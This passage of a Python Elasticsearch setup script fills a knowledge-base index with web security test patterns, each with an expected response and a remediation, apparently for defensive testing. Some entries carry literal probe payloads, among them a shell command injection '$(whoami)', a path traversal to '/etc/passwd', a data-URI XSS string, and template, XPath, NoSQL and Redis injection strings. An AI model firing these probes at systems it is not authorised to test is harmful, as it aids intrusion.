                "test_pattern": "Test Cross-Origin Resource Sharing",
                "payload": "Attempt cross-origin requests",
                "expected_response": "Restricted cross-origin access",
                "remediation": "Implement strict CORS policy",
                "risk_level": "High"
            },
            {
                "category": "API Security",
                "vulnerability_type": "Insecure Deserialization",
                "test_pattern": "Test object deserialization",
                "payload": "Malformed serialized object",
                "expected_response": "400 Bad Request",
                "remediation": "Use safe deserialization libraries, validate input",
                "risk_level": "Critical"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Single Sign-On (SSO) Bypass",
                "test_pattern": "Test SSO authentication mechanism",
                "payload": "Manipulate SSO authentication flow",
                "expected_response": "Authentication failure",
                "remediation": "Implement robust SSO validation",
                "risk_level": "Critical"
            },
            {
                "category": "Injection",
                "vulnerability_type": "Redis Injection",
                "test_pattern": "Test Redis command injection",
                "payload": "EVAL \"redis.call('SET', KEYS[1], ARGV[1])\" 1 malicious_key value",
                "expected_response": "400 Bad Request",
                "remediation": "Use parameterized Redis commands",
                "risk_level": "High"
            },
            {
                "category": "Input Validation",
                "vulnerability_type": "ZIP Slip",
                "test_pattern": "Test file path traversal in archive extraction",
                "payload": "../../../etc/passwd",
                "expected_response": "400 Bad Request",
                "remediation": "Validate file paths during archive extraction",
                "risk_level": "High"
            },
            {
                "category": "Cryptography",
                "vulnerability_type": "Weak Cryptographic Padding",
                "test_pattern": "Test cryptographic padding oracle",
                "payload": "Manipulate encrypted payload",
                "expected_response": "Padding validation failure",
                "remediation": "Use constant-time padding validation",
                "risk_level": "High"
            },
            {
                "category": "Session Management",
                "vulnerability_type": "Session Riding",
                "test_pattern": "Test CSRF token implementation",
                "payload": "Attempt to forge cross-site request",
                "expected_response": "CSRF token validation failure",
                "remediation": "Implement strong CSRF protection",
                "risk_level": "High"
            },
            {
                "category": "API Security",
                "vulnerability_type": "API Key Exposure",
                "test_pattern": "Test API key handling",
                "payload": "Check for API key in logs or responses",
                "expected_response": "No API key exposure",
                "remediation": "Use environment variables, avoid hardcoding",
                "risk_level": "Critical"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Credential Stuffing",
                "test_pattern": "Test login attempt with known credentials",
                "payload": "Bulk login attempts from leaked credentials",
                "expected_response": "Account lockout or additional verification",
                "remediation": "Implement multi-factor authentication",
                "risk_level": "High"
            },
            {
                "category": "Injection",
                "vulnerability_type": "GraphQL Injection",
                "test_pattern": "Test GraphQL query injection",
                "payload": "{__schema{types{name}}}",
                "expected_response": "400 Bad Request",
                "remediation": "Implement query depth limiting and complexity analysis",
                "risk_level": "High"
            },
            {
                "category": "Configuration",
                "vulnerability_type": "Misconfigured Security Headers",
                "test_pattern": "Test HTTP security headers",
                "payload": "Check for missing security headers",
                "expected_response": "Comprehensive security headers",
                "remediation": "Implement strict security headers",
                "risk_level": "Medium"
            },
            {
                "category": "Input Validation",
                "vulnerability_type": "Regular Expression Denial of Service (ReDoS)",
                "test_pattern": "Test regex pattern matching",
                "payload": "a{1,}a{1,}a{1,}a{1,}a{1,}a{1,}a{1,}a{1,}a{1,}a{1,}",
                "expected_response": "Regex timeout or rejection",
                "remediation": "Use safe regex implementations, set timeout",
                "risk_level": "Medium"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Remember Me Functionality Weakness",
                "test_pattern": "Test persistent login mechanism",
                "payload": "Manipulate remember me token",
                "expected_response": "Secure token generation",
                "remediation": "Use secure, time-limited persistent tokens",
                "risk_level": "High"
            },
            {
                "category": "API Security",
                "vulnerability_type": "Webhook Vulnerability",
                "test_pattern": "Test webhook endpoint security",
                "payload": "Forge webhook request",
                "expected_response": "Request signature validation",
                "remediation": "Implement webhook request signing",
                "risk_level": "High"
            },
            {
                "category": "Cryptography",
                "vulnerability_type": "Padding Oracle Attack",
                "test_pattern": "Test cryptographic padding validation",
                "payload": "Manipulate encrypted payload",
                "expected_response": "Constant-time error responses",
                "remediation": "Use constant-time padding validation",
                "risk_level": "Critical"
            },
            {
                "category": "Input Validation",
                "vulnerability_type": "Data URI Injection",
                "test_pattern": "Test data URI handling",
                "payload": "data:text/html,<script>alert('XSS')</script>",
                "expected_response": "400 Bad Request",
                "remediation": "Validate and sanitize data URI inputs",
                "risk_level": "High"
            },
            {
                "category": "API Security",
                "vulnerability_type": "Parameter Pollution",
                "test_pattern": "Test duplicate parameter handling",
                "payload": "Duplicate key-value pairs in request",
                "expected_response": "Consistent parameter handling",
                "remediation": "Implement strict parameter parsing rules",
                "risk_level": "Medium"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Social Engineering Bypass",
                "test_pattern": "Test identity verification mechanisms",
                "payload": "Attempt social engineering attack",
                "expected_response": "Robust identity verification",
                "remediation": "Implement multi-factor verification",
                "risk_level": "High"
            },
            {
                "category": "Injection",
                "vulnerability_type": "XPATH Injection",
                "test_pattern": "Test XML query manipulation",
                "payload": "' or 1=1 or ''='",
                "expected_response": "400 Bad Request",
                "remediation": "Use parameterized XPATH queries",
                "risk_level": "High"
            },
            {
                "category": "Input Validation",
                "vulnerability_type": "Unicode Character Spoofing",
                "test_pattern": "Test homograph attack prevention",
                "payload": "Use of similar-looking Unicode characters",
                "expected_response": "Character normalization",
                "remediation": "Implement Unicode normalization and homograph detection",
                "risk_level": "Medium"
            },
            {
                "category": "Cryptography",
                "vulnerability_type": "Weak Initialization Vector",
                "test_pattern": "Test cryptographic IV generation",
                "payload": "Predictable or reused IV",
                "expected_response": "Cryptographically secure IV",
                "remediation": "Use cryptographically secure random IV generation",
                "risk_level": "High"
            },
            {
                "category": "Configuration",
                "vulnerability_type": "Exposed Cloud Metadata",
                "test_pattern": "Test cloud metadata endpoint access",
                "payload": "Access cloud instance metadata",
                "expected_response": "Restricted metadata access",
                "remediation": "Implement network-level metadata protection",
                "risk_level": "Critical"
            },
            {
                "category": "API Security",
                "vulnerability_type": "Blind Server-Side Request Forgery",
                "test_pattern": "Test server-side request handling",
                "payload": "Attempt to access internal resources",
                "expected_response": "Request validation and filtering",
                "remediation": "Implement strict URL whitelisting",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "JWT Algorithm None Vulnerability",
                "test_pattern": "Test JWT token validation",
                "payload": "JWT with 'none' algorithm",
                "expected_response": "Token rejection",
                "remediation": "Enforce strict algorithm validation",
                "risk_level": "Critical"
            },
            {
                "category": "Injection",
                "vulnerability_type": "Server-Side Template Injection (SSTI)",
                "test_pattern": "Test template rendering security",
                "payload": "${7*7}",
                "expected_response": "400 Bad Request",
                "remediation": "Use safe template rendering libraries",
                "risk_level": "High"
            },
            {
                "category": "Input Validation",
                "vulnerability_type": "HTML5 Storage Injection",
                "test_pattern": "Test client-side storage manipulation",
                "payload": "Inject malicious data into localStorage",
                "expected_response": "Input sanitization",
                "remediation": "Validate and sanitize data before storage",
                "risk_level": "Medium"
            },
            {
                "category": "Cryptography",
                "vulnerability_type": "Weak Random Number Generation",
                "test_pattern": "Test randomness of generated values",
                "payload": "Analyze random number distribution",
                "expected_response": "Cryptographically secure randomness",
                "remediation": "Use cryptographically secure PRNGs",
                "risk_level": "High"
            },
            {
                "category": "Session Management",
                "vulnerability_type": "Session Puzzling",
                "test_pattern": "Test session handling across multiple applications",
                "payload": "Manipulate session identifiers",
                "expected_response": "Consistent session management",
                "remediation": "Implement application-specific session isolation",
                "risk_level": "Medium"
            },
            {
                "category": "API Security",
                "vulnerability_type": "GraphQL Batch Query Attack",
                "test_pattern": "Test GraphQL query complexity",
                "payload": "Multiple complex nested queries",
                "expected_response": "Query complexity limitation",
                "remediation": "Implement query depth and complexity restrictions",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Multi-Factor Authentication Bypass",
                "test_pattern": "Test 2FA implementation robustness",
                "payload": "Bypass secondary authentication factor",
                "expected_response": "Strict 2FA validation",
                "remediation": "Implement robust multi-factor authentication",
                "risk_level": "Critical"
            },
            {
                "category": "Injection",
                "vulnerability_type": "Database Connection String Injection",
                "test_pattern": "Test database connection string handling",
                "payload": ";database=malicious_db",
                "expected_response": "400 Bad Request",
                "remediation": "Validate and sanitize connection string inputs",
                "risk_level": "High"
            },
            {
                "category": "Configuration",
                "vulnerability_type": "Misconfigured DNS",
                "test_pattern": "Test DNS resolution and configuration",
                "payload": "Attempt DNS rebinding",
                "expected_response": "Prevent DNS rebinding",
                "remediation": "Implement DNS pinning and validation",
                "risk_level": "Medium"
            },
            {
                "category": "Input Validation",
                "vulnerability_type": "Email Address Validation Bypass",
                "test_pattern": "Test email validation mechanism",
                "payload": "Test edge cases in email validation",
                "expected_response": "Comprehensive email validation",
                "remediation": "Use RFC-compliant email validation",
                "risk_level": "Medium"
            },
            {
                "category": "Cryptography",
                "vulnerability_type": "Insufficient Entropy in Key Generation",
                "test_pattern": "Test cryptographic key generation",
                "payload": "Analyze key generation randomness",
                "expected_response": "High-entropy key generation",
                "remediation": "Use secure key generation with sufficient entropy",
                "risk_level": "High"
            },
            {
                "category": "API Security",
                "vulnerability_type": "Pagination Attack",
                "test_pattern": "Test API pagination implementation",
                "payload": "Manipulate pagination parameters",
                "expected_response": "Secure pagination controls",
                "remediation": "Implement server-side pagination validation",
                "risk_level": "Medium"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "OAuth Token Replay",
                "test_pattern": "Test OAuth token reuse",
                "payload": "Attempt to reuse expired OAuth token",
                "expected_response": "Token invalidation",
                "remediation": "Implement token binding and short-lived tokens",
                "risk_level": "High"
            },
            {
                "category": "Injection",
                "vulnerability_type": "NoSQL Query Injection",
                "test_pattern": "Test NoSQL query manipulation",
                "payload": "{\"$where\": \"JavaScript injection\"}",
                "expected_response": "400 Bad Request",
                "remediation": "Use parameterized queries and input validation",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Passwordless Authentication Bypass",
                "test_pattern": "Test magic link and token-based authentication",
                "payload": "Manipulate authentication token generation",
                "expected_response": "Secure token validation",
                "remediation": "Implement time-limited, single-use tokens",
                "risk_level": "Critical"
            },
            {
                "category": "API Security",
                "vulnerability_type": "API Versioning Exploitation",
                "test_pattern": "Test legacy API version access",
                "payload": "Access deprecated API endpoints",
                "expected_response": "Version deprecation or forced upgrade",
                "remediation": "Implement strict API version management",
                "risk_level": "Medium"
            },
            {
                "category": "Injection",
                "vulnerability_type": "Shell Command Injection",
                "test_pattern": "Test system command execution",
                "payload": "$(whoami)",
                "expected_response": "400 Bad Request",
                "remediation": "Avoid shell command execution, use safe APIs",
                "risk_level": "Critical"
            },
            {
                "category": "Input Validation",
                "vulnerability_type": "Runtime Type Confusion",
                "test_pattern": "Test type handling in dynamic languages",
                "payload": "Exploit type conversion vulnerabilities",
                "expected_response": "Strict type validation",
                "remediation": "Implement robust type checking",
                "risk_level": "High"
            },
            {
                "category": "Cryptography",
                "vulnerability_type": "Improper Key Destruction",
                "test_pattern": "Test cryptographic key lifecycle",
                "payload": "Attempt to recover deleted keys",
                "expected_response": "Secure key destruction",
                "remediation": "Implement secure key zeroing and destruction",
                "risk_level": "Medium"
            },
            {
                "category": "Configuration",
                "vulnerability_type": "Container Escape",
                "test_pattern": "Test container isolation",
                "payload": "Attempt to break container boundaries",
                "expected_response": "Container isolation maintained",
                "remediation": "Implement strict container security controls",
                "risk_level": "Critical"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "WebAuthn Implementation Weakness",
                "test_pattern": "Test WebAuthn authentication mechanism",
                "payload": "Manipulate WebAuthn registration process",
                "expected_response": "Secure authentication challenge",
                "remediation": "Implement robust WebAuthn validation",
                "risk_level": "High"
            },
            {
                "category": "API Security",
                "vulnerability_type": "Insecure API Documentation",
                "test_pattern": "Test API documentation exposure",
                "payload": "Access sensitive API details",
                "expected_response": "Limited API documentation",
                "remediation": "Implement controlled API documentation access",
                "risk_level": "Medium"
            },
            {
                "category": "Injection",
                "vulnerability_type": "Protocol Buffer Injection",
                "test_pattern": "Test protobuf message parsing",
                "payload": "Malformed Protocol Buffer message",
                "expected_response": "400 Bad Request",
                "remediation": "Implement strict protobuf message validation",
                "risk_level": "High"
            },
            {
                "category": "Input Validation",
                "vulnerability_type": "Integer Overflow",
                "test_pattern": "Test numeric input handling",
                "payload": "Extremely large numeric input",
                "expected_response": "Input validation",
                "remediation": "Implement bounds checking for numeric inputs",
                "risk_level": "Medium"
            },
            {
                "category": "Cryptography",
                "vulnerability_type": "Insufficient Key Rotation",
                "test_pattern": "Test cryptographic key lifecycle",
                "payload": "Check key rotation frequency",
                "expected_response": "Regular key rotation",
                "remediation": "Implement periodic key rotation",
                "risk_level": "Medium"
            },
            {
                "category": "Session Management",
                "vulnerability_type": "Cross-Site Session Transfer",
                "test_pattern": "Test session transfer between domains",
                "payload": "Attempt to transfer session across applications",
                "expected_response": "Session isolation",
                "remediation": "Implement strict session domain binding",
                "risk_level": "High"
            },
            {
                "category": "API Security",
                "vulnerability_type": "Insecure API Composition",
                "test_pattern": "Test API integration security",
                "payload": "Exploit vulnerabilities in API composition",
                "expected_response": "Secure API composition",
                "remediation": "Implement secure API integration patterns",
                "risk_level": "Medium"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Biometric Authentication Bypass",
                "test_pattern": "Test biometric authentication mechanism",
                "payload": "Attempt to bypass biometric verification",
                "expected_response": "Robust biometric validation",
                "remediation": "Implement multi-factor biometric authentication",
                "risk_level": "High"
            },
            {
                "category": "Injection",
                "vulnerability_type": "Expression Language Injection",
                "test_pattern": "Test expression language parsing",
                "payload": "${1+1}",
                "expected_response": "400 Bad Request",
                "remediation": "Sanitize and validate expression inputs",
                "risk_level": "High"
            },
            {
                "category": "Configuration",
                "vulnerability_type": "Misconfigured Serverless Functions",
                "test_pattern": "Test serverless function security",
                "payload": "Attempt to exploit function configuration",
                "expected_response": "Secure function configuration",
                "remediation": "Implement least privilege for serverless functions",
                "risk_level": "Medium"
            },
            {
                "category": "Input Validation",
                "vulnerability_type": "Polymorphic Payload Injection",
                "test_pattern": "Test input transformation handling",
                "payload": "Payload with multiple transformation techniques",
                "expected_response": "Comprehensive input validation",
                "remediation": "Implement multi-layer input sanitization",
                "risk_level": "High"
            },
            {
                "category": "Cryptography",
                "vulnerability_type": "Timing Attack Vulnerability",
                "test_pattern": "Test cryptographic comparison",
                "payload": "Analyze response timing",
                "expected_response": "Constant-time comparison",
                "remediation": "Implement constant-time comparison algorithms",
                "risk_level": "Medium"
            },
            {
                "category": "API Security",
                "vulnerability_type": "Recursive API Call Exploitation",
                "test_pattern": "Test API recursion limits",
                "payload": "Recursive API calls",
                "expected_response": "API call depth limitation",
                "remediation": "Implement maximum recursion depth",
                "risk_level": "Medium"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Machine-to-Machine Authentication Weakness",
                "test_pattern": "Test M2M authentication mechanism",
                "payload": "Attempt to forge machine credentials",
                "expected_response": "Robust M2M authentication",
                "remediation": "Implement mutual TLS and strong credential validation",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "HTTP Method Override Bypass",
                "test_pattern": "Test authentication enforcement across HTTP methods",
                "payload": "Change POST to GET with X-HTTP-Method-Override: GET",
                "expected_response": "401 Unauthorized",
                "remediation": "Enforce authentication consistently across all HTTP methods",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "JWT Signature Verification Bypass",
                "test_pattern": "Test JWT signature verification process",
                "payload": "Modified JWT payload with unchanged signature",
                "expected_response": "401 Unauthorized",
                "remediation": "Implement proper signature verification and use strong keys",
                "risk_level": "Critical"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Authentication Header Case Sensitivity",
                "test_pattern": "Test case sensitivity in authentication headers",
                "payload": "Modify header case: 'authorization' instead of 'Authorization'",
                "expected_response": "Consistent header handling regardless of case",
                "remediation": "Implement case-insensitive header processing",
                "risk_level": "Medium"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Session Fixation",
                "test_pattern": "Test if pre-authentication session IDs are changed after login",
                "payload": "Set session ID before authentication and check if it changes after login",
                "expected_response": "New session ID assigned after authentication",
                "remediation": "Generate new session ID after successful authentication",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Broken Multi-Step Authentication",
                "test_pattern": "Test multi-step authentication flow integrity",
                "payload": "Skip intermediate steps in multi-step authentication process",
                "expected_response": "401 Unauthorized",
                "remediation": "Validate each step and maintain secure authentication state",
                "risk_level": "Critical"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Authorization Header Stripping",
                "test_pattern": "Test proxy handling of authentication headers",
                "payload": "Use headers like X-Original-Authorization to bypass front-end security",
                "expected_response": "401 Unauthorized",
                "remediation": "Only accept standard authentication headers and validate at all layers",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "JWT Empty Signature Bypass",
                "test_pattern": "Test handling of JWT tokens with empty signatures",
                "payload": "Modify JWT structure with empty signature part",
                "expected_response": "401 Unauthorized",
                "remediation": "Validate JWT structure and require valid signatures",
                "risk_level": "Critical"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Timing-Based Authentication Bypass",
                "test_pattern": "Test for timing leaks in authentication",
                "payload": "Measure response times with different credentials",
                "expected_response": "Constant-time responses regardless of input",
                "remediation": "Implement constant-time comparison for credentials",
                "risk_level": "Medium"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "API Key in URL Bypass",
                "test_pattern": "Test for authentication using URL parameters instead of headers",
                "payload": "Move API key from Authorization header to URL parameter",
                "expected_response": "401 Unauthorized",
                "remediation": "Only accept authentication in headers, not in URL parameters",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Bearer Prefix Bypass",
                "test_pattern": "Test token acceptance without required prefix",
                "payload": "Send JWT token without 'Bearer' prefix",
                "expected_response": "401 Unauthorized",
                "remediation": "Strictly validate token format including required prefixes",
                "risk_level": "Medium"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Cross-Service Authentication Bypass",
                "test_pattern": "Test authentication across different services",
                "payload": "Use authentication token from one service to access another",
                "expected_response": "401 Unauthorized",
                "remediation": "Implement service-specific token validation and audience checks",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Authentication Race Condition",
                "test_pattern": "Test concurrent authentication requests",
                "payload": "Submit multiple authentication requests simultaneously",
                "expected_response": "Proper handling of concurrent requests",
                "remediation": "Implement thread-safe authentication processes",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "JWT Algorithm Confusion",
                "test_pattern": "Test for algorithm confusion in JWT verification",
                "payload": "Change JWT from RS256 to HS256 using public key as secret",
                "expected_response": "401 Unauthorized",
                "remediation": "Explicitly specify and verify the algorithm used",
                "risk_level": "Critical"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Missing Authentication for Critical Function",
                "test_pattern": "Test critical function access without authentication",
                "payload": "Access critical endpoint without authentication",
                "expected_response": "401 Unauthorized",
                "remediation": "Ensure all critical functions require proper authentication",
                "risk_level": "Critical"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Cookie Authentication Bypass",
                "test_pattern": "Test for cookie-based authentication weaknesses",
                "payload": "Modify or forge authentication cookies",
                "expected_response": "401 Unauthorized",
                "remediation": "Use signed and encrypted cookies with proper validation",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Authentication Cache Poisoning",
                "test_pattern": "Test for cached authentication results",
                "payload": "Cache poisoning attack targeting authentication results",
                "expected_response": "Authentication decisions not cached",
                "remediation": "Don't cache authentication results or implement secure cache validation",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Authentication Logic Bypass",
                "test_pattern": "Test for logical flaws in authentication flow",
                "payload": "Manipulate authentication flow sequence",
                "expected_response": "Robust authentication regardless of request order",
                "remediation": "Implement proper authentication state management",
                "risk_level": "Critical"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Referer Header Authentication Bypass",
                "test_pattern": "Test for Referer header-based authentication",
                "payload": "Spoof Referer header to bypass authentication",
                "expected_response": "401 Unauthorized",
                "remediation": "Never rely on Referer header for authentication decisions",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "IP-Based Authentication Bypass",
                "test_pattern": "Test for IP-based authentication weaknesses",
                "payload": "Spoof source IP using X-Forwarded-For header",
                "expected_response": "401 Unauthorized",
                "remediation": "Use secure methods for IP validation or avoid IP-based authentication",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Forced Browsing Authentication Bypass",
                "test_pattern": "Test direct access to protected pages",
                "payload": "Directly browse to protected endpoints bypassing login flow",
                "expected_response": "401 Unauthorized",
                "remediation": "Enforce authentication checks on all protected resources",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Expired JWT with Modified Expiry Claim",
                "test_pattern": "Test JWT expiry validation",
                "payload": "Modify expiry claim in expired JWT token",
                "expected_response": "401 Unauthorized",
                "remediation": "Implement server-side validation of token expiry and signature verification",
                "risk_level": "Critical"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "CORS Authentication Bypass",
                "test_pattern": "Test for authentication weaknesses in CORS implementation",
                "payload": "Exploit misconfigured CORS to perform cross-origin requests",
                "expected_response": "CORS headers properly restrict access",
                "remediation": "Implement proper CORS policy with appropriate origin restrictions",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "JWT Kid Header Injection",
                "test_pattern": "Test for key ID (kid) parameter injection in JWT",
                "payload": "Manipulate kid header parameter to point to a different key",
                "expected_response": "401 Unauthorized",
                "remediation": "Validate and sanitize the kid parameter before using it",
                "risk_level": "Critical"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Subdomain Authentication Bypass",
                "test_pattern": "Test authentication across different subdomains",
                "payload": "Use authentication from one subdomain on another",
                "expected_response": "401 Unauthorized",
                "remediation": "Implement proper domain/subdomain isolation for authentication",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "CAPTCHA Bypass Authentication",
                "test_pattern": "Test CAPTCHA implementation in authentication",
                "payload": "Reuse or forge CAPTCHA tokens",
                "expected_response": "Rejected authentication attempt",
                "remediation": "Implement server-side validation and single-use CAPTCHA tokens",
                "risk_level": "Medium"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Username Enumeration",
                "test_pattern": "Test for username enumeration during authentication",
                "payload": "Submit requests with different usernames and analyze responses",
                "expected_response": "Generic error message regardless of username validity",
                "remediation": "Use consistent error messages and response times",
                "risk_level": "Medium"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Request Method Authentication Bypass",
                "test_pattern": "Test authentication across different HTTP methods",
                "payload": "Change request method from POST to GET for authenticated endpoints",
                "expected_response": "401 Unauthorized",
                "remediation": "Enforce authentication consistently across all HTTP methods",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "External Authentication Bypass",
                "test_pattern": "Test for vulnerabilities in external authentication integrations",
                "payload": "Manipulate authentication data from external identity providers",
                "expected_response": "401 Unauthorized",
                "remediation": "Validate all authentication data received from external sources",
                "risk_level": "Critical"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "HMAC Signature Bypass",
                "test_pattern": "Test HMAC signature validation",
                "payload": "Modify request data without updating HMAC signature",
                "expected_response": "401 Unauthorized",
                "remediation": "Verify HMAC signatures against all relevant request data",
                "risk_level": "Critical"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Authentication Downgrade Attack",
                "test_pattern": "Test for authentication method downgrading",
                "payload": "Force downgrade to weaker authentication mechanism",
                "expected_response": "Enforcement of strong authentication methods",
                "remediation": "Prevent authentication downgrades and enforce minimum security requirements",
                "risk_level": "High"
            }
        ]

        for pattern in security_patterns:
            self.es.index(index=self.knowledge_base_index, document=pattern)

        logger.info("Knowledge base populated with security patterns")

        return security_patterns


if __name__ == "__main__":
    setup = ElasticsearchSetup()
    setup.run()